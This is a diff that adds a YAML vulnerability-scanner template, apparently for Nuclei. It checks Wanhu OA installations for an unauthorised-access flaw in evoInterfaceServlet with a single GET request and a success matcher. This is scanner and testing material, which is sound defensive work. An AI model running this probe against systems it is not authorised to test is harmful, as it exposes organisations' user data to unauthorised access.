@@ -1,0 +1,27 @@
+id: wanhuOA-evoInterfaceServlet-unauthorized
+info:
+  name: 万户OA未授权访问漏洞
+  author: cnaq
+  severity: high
+  description: description
+  reference:
+    - https://mp.weixin.qq.com/s/zb11jjRnBDwF49e6bmYpHw
+  tags: unauth
+requests:
+  - raw:
+      - |+
+        GET /defaultroot/evoInterfaceServlet?paramType=user HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - result:'success'
+      - type: word
+        part: header
+        words:
+          - '200'
